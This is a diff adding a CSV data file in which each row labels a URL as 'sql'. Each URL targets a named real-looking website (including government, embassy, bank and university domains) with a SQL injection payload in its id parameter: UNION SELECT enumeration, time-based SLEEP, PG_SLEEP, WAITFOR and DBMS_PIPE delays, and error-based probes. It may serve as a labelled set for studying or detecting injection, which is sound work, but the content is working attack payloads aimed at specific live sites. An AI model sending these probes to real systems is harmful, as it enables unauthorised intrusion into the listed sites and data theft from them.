@@ -1,0 +1,626 @@
+1,sql,http://www.romanianwriters.ro/s.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- JiPD
+2,sql,http://www.bible-history.com/subcat.php?id=1%' AND 2404=6511 AND '%'='
+3,sql,http://ruscongrmech2015.ru/index.php?id=1 AND SLEEP(5)
+4,sql,http://berkeleyrecycling.org/page.php?id=1 ORDER BY 1-- kzEn
+5,sql,http://www.xrayrisk.com/calculator/calculator-normal-studies.php?id=1 AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC)-- VWJB
+6,sql,http://193.232.218.56/web-local/prep/rj/index.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- JiPD
+8,sql,https://www.fleurlis.com.tw/en/wedding.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL-- vGXN
+9,sql,http://www.dipintoguitars.com/category.php?id=1');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(106)||CHR(102)||CHR(83),5) FROM DUAL--
+10,sql,http://www.teamgear.us/store.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rekn
+11,sql,http://www.multan.gov.pk/files.php?id=(SELECT (CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (2394=2394) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)))
+12,sql,http://www.asfaa.org/members.php?id=1) UNION ALL SELECT NULL,NULL,NULL-- fqpX
+13,sql,http://www.bpc.gov.bd/contactus.php?id=1' AND SLEEP(5) AND 'itCe'='itCe
+14,sql,https://metacarpolis.com/index.php?id=1) AND SLEEP(5) AND (7824=7824
+15,sql,http://www.jbctools.com/cataleg.php?id=1%' AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND '%'='
+17,sql,http://ansobor.ru/page.php?id=1 WAITFOR DELAY '0:0:5'
+18,sql,http://www.khrunichev.ru/main.php?id=1';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(106)||CHR(102)||CHR(83),5) FROM DUAL--
+19,sql,http://www.studentvote.ca/2011/results/index.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ApsM
+20,sql,https://www.orthphoto.net/user.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rekn
+21,sql,http://esjindex.org/search.php?id=1 AND 6592=(SELECT 6592 FROM PG_SLEEP(5))
+22,sql,http://www.sansihotels.com/hotels.php?id=1' AND SLEEP(5) AND 'itCe'='itCe
+23,sql,http://www.adopfrance.fr/gb/galerie/index.php?id=1') AND 7457=2191 AND ('iHjE'='iHjE
+24,sql,http://www.akko.org.il/map_en.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- gXRN
+25,sql,http://www.paranatural.net/index.php?id=1 ORDER BY 4721-- gPsZ
+26,sql,http://www.photobiology.org/asp.php?id=(SELECT CONCAT(0x71766a6271,(SELECT (ELT(3360=3360,1))),0x7171717871))
+29,sql,http://www.stateofdesign.berlin/subevents.php?id=1' UNION ALL SELECT NULL,NULL,NULL-- hhTM
+30,sql,https://www.acme.in/contentpage.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- pgqv
+31,sql,http://www.komiaviatrans.ru/airport/index.php?id=1');WAITFOR DELAY '0:0:5'--
+32,sql,http://www.cdep.ru/index.php?id=1' ORDER BY 1-- Hgvf
+33,sql,http://www.peml.com/login.php?rtn_url=http://www.peml.com/category.php?id=1' AND SLEEP(5) AND 'itCe'='itCe
+34,sql,http://www.palfi.net/partners.php?id=1) UNION ALL SELECT NULL,NULL-- EXrh
+35,sql,http://www.sabella.fr/fiche.php?id=1) UNION ALL SELECT NULL-- fqfI
+36,sql,http://electronautomotive.com/order.php?id=1%' AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND '%'='
+37,sql,http://en.firenze-online.com/shops/florence-shop.php?id=1 AND SLEEP(5)
+38,sql,http://www.pidsphil.org/journal_info.php?id=1 UNION ALL SELECT NULL,NULL-- ctvb
+39,sql,http://www.egscomics.com/index.php?id=1%' AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND '%'='
+40,sql,https://100wonders.ru/index.php?id=1) AND 6592=(SELECT 6592 FROM PG_SLEEP(5)) AND (2513=2513
+41,sql,http://www.ifsb.org/membership.php?id=1') AND 3611=3611 AND ('xpHU'='xpHU
+42,sql,https://www.ocsalumni.org/events/cart.php?id=1) AND 3611=3611 AND (5554=5554
+43,sql,http://www.ssy.org/detail.php?id=1")))(,,)')
+44,sql,http://www.micwaudio.com/product.php?id=1 ORDER BY 1-- lAea
+45,sql,http://www.smart-ground.eu/partner.php?id=1') AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND ('JGjZ'='JGjZ
+46,sql,http://www.lambbuilding.co.uk/members/profile.php?id=1 AND 3611=3611-- SJqY
+47,sql,http://www.minutesemeiotic.org/home.php?id=5433-5432
+48,sql,http://pedlib.ru/katalogy/katalog.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IKMj
+49,sql,http://bestindustrygroup.com/news.php?id=1%' AND 3611=3611 AND '%'='
+50,sql,http://cityvis.io/detail.php?id=1';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(106)||CHR(102)||CHR(83),5) FROM DUAL--
+51,sql,http://www.fairtradegroupnepal.org/about.php?id=1%' AND 6592=(SELECT 6592 FROM PG_SLEEP(5)) AND '%'='
+52,sql,http://www.cacert.org/index.php?id=1);WAITFOR DELAY '0:0:5'--
+53,sql,http://koshi.fr/achat/produit_details.php?id=1') AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5) AND ('VgiB'='VgiB
+54,sql,http://vlab.co.in/ba_labs_all.php?id=1%' AND 9533 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (9533=9533) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113))) AND '%'='
+55,sql,http://ewfed.com/cat.php?id=(SELECT 8610 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(8610=8610,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+56,sql,https://www.kunstreservebank.nl/index.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- nBvv
+57,sql,http://www.cqfa.ca/public/index.php?id=1'NKZqCS<'">bIRAbA
+58,sql,https://www.free-country-flags.com/flag_pack.php?id=1) AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND (9963=9963
+59,sql,http://www.carrot-home.com/project.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IKMj
+60,sql,https://www.partnerschulnetz.de/index.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bNBY
+61,sql,https://www.albinagroup.com/products.php?id=1%' WAITFOR DELAY '0:0:5' AND '%'='
+62,sql,http://modniditky.com/katalog.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- bDCI
+63,sql,http://www.evanscartoons.com/gallery.php?id=1 AND SLEEP(5)
+64,sql,http://paritarian-funds-construction.eu/page.php?id=1' ORDER BY 6555-- CoTc
+65,sql,https://www.jannah.ae/hotels.php?id=1') AND 9533 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (9533=9533) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113))) AND ('eWKx'='eWKx
+66,sql,http://www.nm.cz/publikace/publikace-detail-en.php?id=1%' AND SLEEP(5) AND '%'='
+67,sql,http://xn--149-5cd9ame0ai0a4e5b.xn--p1ai/page.php?id=1) ORDER BY 1-- zRhc
+68,sql,http://www.daiichisankyo.co.th/aboutus.php?id=1%' AND 6592=(SELECT 6592 FROM PG_SLEEP(5)) AND '%'='
+69,sql,http://www.epomm.eu/maxeva/index.php?id=1' AND 9533 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (9533=9533) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113))) AND 'zLoF'='zLoF
+70,sql,http://www.skystartravels.com/gallery.php?id=1%' AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5) AND '%'='
+72,sql,http://www.sakhalinprokur.ru/contacts.php?id=1;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(106)||CHR(102)||CHR(83),5) FROM DUAL--
+73,sql,http://dance.vftsarr.ru/index.php?id=1' AND 7019=2399 AND 'bmfB'='bmfB
+74,sql,http://gtrkchita.ru/listen.php?id=1 AND 3611=3611-- SJqY
+75,sql,https://learnzone.org.uk/courses/course.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zDon
+76,sql,http://www.jannahplace.com/hotels.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- wXih
+77,sql,http://www.rgcms.edu.in/research.php?id=1.8ChSI
+78,sql,http://www.nordicbook.ru/index.php?id=1') AND 7457=2191 AND ('iHjE'='iHjE
+79,sql,https://vstomp.hotoneaudio.com/ProductsDetail.php?id=1 AND SLEEP(5)-- THvg
+81,sql,http://www.strail.de/index.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rekn
+82,sql,http://www.ohmsghana.com/pages/services.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zDon
+83,sql,http://www.kvm.co.ke/products.php?id=1%' AND 4249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4249=4249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='
+84,sql,http://www.professor-butakov.ru/history/view_history.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bNBY
+85,sql,http://www.indembassy.be/pages.php?id=1') AND 7457=2191 AND ('iHjE'='iHjE
+86,sql,http://www.smtmax.com/category.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL-- fKpc
+87,sql,http://www.mirraketok.ru/subs.php?id=1 AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5)
+88,sql,http://www.arion.ru/template.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bNBY
+89,sql,http://www.myappterms.com/reader.php?id=1;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(106)||CHR(102)||CHR(83),5) FROM DUAL--
+90,sql,http://www.ictet.org/list%2Bmember.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- JiPD
+92,sql,http://www.unifr.ch/form/iaupe_32/view.php?id=1);SELECT PG_SLEEP(5)--
+93,sql,http://www.millennium-tech.net/serviceInfo.php?id=1 AND 6592=(SELECT 6592 FROM PG_SLEEP(5))
+94,sql,http://www.jdcaravan.com/store.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- hrdu
+95,sql,https://www.nationaloil.co.ke/site/2.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- Syfp
+96,sql,https://www.crocodile.com.hk/en/webpage.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- BMLy
+97,sql,http://www.icona.info/content.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- BMLy
+98,sql,http://www1.clermont.inra.fr/wq/index.php?id=1';SELECT PG_SLEEP(5)--
+99,sql,http://www.shorttrackonline.info/web-tv.php?id=1 AND 3611=3611-- SJqY
+101,sql,http://safring.adu.org.za/content.php?id=1;SELECT PG_SLEEP(5)--
+102,sql,http://www.phpsimplicity.com/tips.php?id=1 AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5)-- jIbI
+104,sql,https://ticketpay.jp/support_page.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- Syfp
+105,sql,https://www.aaaauto.eu/en/users.php?id=1 UNION ALL SELECT NULL,NULL-- sopn
+106,sql,http://www.mvpvo.ru/inner.php?id=1 AND 6592=(SELECT 6592 FROM PG_SLEEP(5))-- Qmvu
+108,sql,https://www.law.cuhk.edu.hk/en/people/info.php?id=1') AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5) AND ('VgiB'='VgiB
+110,sql,https://www.cmu.ac.th/en/engaboutcmu.php?id=1';SELECT PG_SLEEP(5)--
+111,sql,https://www.indianembassythimphu.bt/pages.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zDon
+114,sql,https://www.tonfly.com/helmet.php?id=1) ORDER BY 4287-- vRlT
+115,sql,http://www.polosub.com/scheda_mute_en.php?id=1 AND SLEEP(5)-- THvg
+116,sql,https://xn--80aaejurlecbd2k8c.xn--p1ai/index.php?id=1")))(,,)')
+117,sql,http://www.sinohytec.com/en/page.php?id=1') ORDER BY 1-- tslS
+118,sql,https://friendsofscience.org/index.php?id=1' AND 3611=3611 AND 'oygD'='oygD
+119,sql,http://www.blessgans.de/index.php?id=1 AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC)-- VWJB
+120,sql,http://www.zentrumexil.at/index.php?id=1 ORDER BY 1715-- vHUQ
+121,sql,https://www.laboshop.com/index.php?id=1%';WAITFOR DELAY '0:0:5'--
+122,sql,http://www.stalmax.com/index.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- dLhL
+123,sql,https://rational.org/index.php?id=1) UNION ALL SELECT NULL,NULL,NULL-- fqpX
+124,sql,https://library.geraldika.ru/book.php?id=1) WAITFOR DELAY '0:0:5' AND (5754=5754
+125,sql,http://www.redtory.com.cn/english/about.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- gXRN
+126,sql,http://www.innofader.com/products.php?id=1 UNION ALL SELECT NULL,NULL,NULL-- lXro
+127,sql,http://www.freescience.info/books.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL-- zhRN
+128,sql,http://www.treeviewthai.com/service_en.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL-- fKpc
+129,sql,http://www.ghanatimber.org/certification_details.php?id=1%' ORDER BY 1-- KBQw
+131,sql,http://venusita-moda.com/article.php?id=1') UNION ALL SELECT NULL,NULL,NULL-- SOSW
+132,sql,http://byglearning.co.uk/mrcrsc-lms/course/category.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- IshX
+133,sql,http://www.mcdonalds.co.jp/quality/allergy_Nutrition/nutrient2.php?id=1) ORDER BY 1-- zRhc
+134,sql,http://www.energyquest.com.au/reports.php?id=1 WAITFOR DELAY '0:0:5'-- akjU
+135,sql,http://www.rideitmoto.com/products_list1.php?id=1' AND SLEEP(5) AND 'itCe'='itCe
+137,sql,http://www.tdap.gov.pk/trade-bodies.php?id=1%' UNION ALL SELECT NULL,NULL-- DONg
+138,sql,https://www.ileswastesystems.co.uk/index.php?id=1') ORDER BY 4722-- epns
+140,sql,https://mahara.org/group/view.php?id=1' WAITFOR DELAY '0:0:5' AND 'cIcm'='cIcm
+141,sql,http://www.palavrion.com/index.php?id=1 AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC)-- VWJB
+143,sql,https://www.indianembassy.de/pages.php?id=1' AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5) AND 'BOxx'='BOxx
+144,sql,https://www.dt-shop.com/index.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IKMj
+145,sql,http://www.gulf1bank.com/page.php?id=1' UNION ALL SELECT NULL,NULL-- ViPr
+146,sql,http://www.nsb.gov.bt/publication/publications.php?id=1' UNION ALL SELECT NULL-- lmXC
+147,sql,http://www.cubana.ru/about.php?id=1 UNION ALL SELECT NULL,NULL-- sopn
+148,sql,http://nursing.flinders.edu.au/students/studyaids/drugcalculations/page.php?id=1) AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5) AND (4586=4586
+149,sql,http://outbacklabs.com/listing.php?id=1%' WAITFOR DELAY '0:0:5' AND '%'='
+150,sql,http://www.viparspectra.com/category.php?id=1 AND 3611=3611
+151,sql,http://silverstateenergy.org/announcement.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- NXUF
+152,sql,https://edlinked.soe.waikato.ac.nz/research/journal/index.php?id=1%' AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5) AND '%'='
+153,sql,http://www.ausmip.org/main.php?id=1 AND 4249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4249=4249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL)
+154,sql,http://www.realisticky.cz/ucebnice.php?id=6787
+155,sql,http://www.pyme.go.cr/cuadro1.php?id=1) UNION ALL SELECT NULL,NULL,NULL-- fqpX
+156,sql,http://www.hrpub.org/journals/jour_info.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ntmA
+157,sql,http://www.ipicshopping.co.za/shopping_centre.php?id=1') AND 4249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4249=4249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL) AND ('mQhu'='mQhu
+158,sql,http://biblia.deon.pl/rozdzial.php?id=1;SELECT PG_SLEEP(5)--
+160,sql,http://www.vaughanchinese.com/new/websites/content.php?id=1') AND 3611=3611 AND ('xpHU'='xpHU
+161,sql,http://alphaonenow.org/info.php?id=1) AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5) AND (4586=4586
+162,sql,https://polenow.com/login.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- aPje
+164,sql,http://www.justiceforsergei.com/video.php?id=1 AND 3050=5102
+165,sql,http://www.mujahidkamran.com/books.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ApsM
+166,sql,https://www.anglesgallery.com/ssp_director/artistgallery.php?id=1') ORDER BY 1-- tslS
+167,sql,http://identitiesjournal.edu.mk/cat.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- bDCI
+168,sql,http://www.microfinance.lk/member_profile.php?id=1.8ChSI
+169,sql,http://www.aphesa.com/downloads/download2.php?id=1) AND 6592=(SELECT 6592 FROM PG_SLEEP(5)) AND (2513=2513
+170,sql,http://www.microatena.it/biblioteca.php?id=1';WAITFOR DELAY '0:0:5'--
+171,sql,https://www.safari-hotels.com/site/3.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- BuTs
+172,sql,http://dancingbetty.com/product-list.php?id=1%' AND 4249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4249=4249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='
+173,sql,http://www.terraclean.net/product.php?id=1;WAITFOR DELAY '0:0:5'--
+174,sql,http://www.gainwelltravel.com/cms.php?id=1) AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND (9963=9963
+175,sql,http://www.morini.ch/product_det.php?id=1') UNION ALL SELECT NULL,NULL,NULL-- SOSW
+176,sql,http://www.renexpo-bih.com/index.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- hrdu
+178,sql,https://learning.thefa.com/totara/program/view.php?id=1') AND SLEEP(5) AND ('GJyr'='GJyr
+179,sql,http://www.austinminiatures.com/products.php?id=1 UNION ALL SELECT NULL,NULL-- ctvb
+180,sql,http://kpd1.ru/catalog.php?id=1';WAITFOR DELAY '0:0:5'--
+181,sql,http://www.habibitours.com/cat.php?id=1 ORDER BY 1715-- vHUQ
+182,sql,http://www.daesgroup.com/region.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- wXih
+183,sql,http://www.ventrilo.com/dlprod.php?id=1%' UNION ALL SELECT NULL,NULL,NULL-- Lunn
+184,sql,http://www.system16.com/museum.php?id=1 UNION ALL SELECT NULL-- uRNf
+185,sql,http://www.stabilizationandtransition.org/Bio.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ntmA
+186,sql,http://www.turbaza-volgograd.ru/viewbase.php?id=1') ORDER BY 1-- tslS
+187,sql,http://www.sunxtender.com/solarbattery.php?id=1 AND 3611=3611-- SJqY
+188,sql,http://www.cmt-net.org/index.php?id=1' UNION ALL SELECT NULL,NULL-- ViPr
+189,sql,http://www.cultuurwijzerapeldoorn.nl/cultuurmenu.php?id=1%';WAITFOR DELAY '0:0:5'--
+190,sql,http://www.indiainfrastructure.com/shopping_cart.php?id=1 UNION ALL SELECT NULL,NULL-- ctvb
+191,sql,https://www.kianjoocan.com.my/index.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ApsM
+194,sql,http://ska3.ru/bummi.php?id=1' UNION ALL SELECT NULL,NULL,NULL-- hhTM
+195,sql,http://www.caosciotocounty.org/template.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- bDCI
+197,sql,http://www.askewsfoods.com/stores.php?id=1.8ChSI
+198,sql,http://www.firstinmichigan.org/stream.php?id=1%' AND 6592=(SELECT 6592 FROM PG_SLEEP(5)) AND '%'='
+199,sql,http://boywhofell.com/index.php?id=1) AND 4249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4249=4249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL) AND (9475=9475
+200,sql,https://www.arabculturefund.org/projects/project.php?id=1' AND 6592=(SELECT 6592 FROM PG_SLEEP(5)) AND 'NYPb'='NYPb
+201,sql,https://www.zobodat.at/publikation_series.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rekn
+202,sql,http://stfranciscountyar.org/page.php?id=1') AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('DVsm'='DVsm
+203,sql,http://www.harvestlink.com/productsDia.php?id=1';WAITFOR DELAY '0:0:5'--
+204,sql,http://www.indiannumismatics.com/products.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ntmA
+205,sql,http://www.integral-eu.com/index.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- CEEX
+206,sql,http://www.howtostudy.org/resources_skill.php?id=6787
+207,sql,http://www.prazskamuzejninoc.cz/2017/clanek.php?id=1 AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC)-- VWJB
+209,sql,http://netintel.ru/index.php?id=1) UNION ALL SELECT NULL-- fqfI
+210,sql,http://www.shortrifles.com/configuration.php?id=1';WAITFOR DELAY '0:0:5'--
+212,sql,http://www.atmarine.fi/index.php?id=1'NKZqCS<'">bIRAbA
+213,sql,http://www.marsfigures.com/main.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- sBcc
+214,sql,http://www.rysslandsresor.se/index.php?id=1) AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND (9963=9963
+215,sql,https://www.ecabank.com/home/index.php?id=(SELECT CHAR(113)+CHAR(118)+CHAR(106)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5838=5838) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113))
+216,sql,http://bram.smartelectronix.com/plugins.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- PViD
+217,sql,http://www.gardenfarmgolf.com/en_locations.php?id=1 AND SLEEP(5)
+218,sql,http://orgia.ru/about.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bNBY
+219,sql,http://www.goafilms.com/location.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- spUE
+220,sql,http://learnonline.health.nz/course/category.php?id=1 ORDER BY 1-- kzEn
+221,sql,http://www.stasy.gr/index.php?id=1 AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+222,sql,https://malffb.gov.vu/index.php?id=1) ORDER BY 4287-- vRlT
+223,sql,http://njsfwc.org/projects.php?id=1%' AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND '%'='
+224,sql,http://www.krao.ru/cd-item.php?id=1 AND 4249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4249=4249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL)
+225,sql,http://www.ulagos.cl/contenido03.php?id=1' ORDER BY 1-- Hgvf
+226,sql,https://wciom.ru/index.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- uqAC
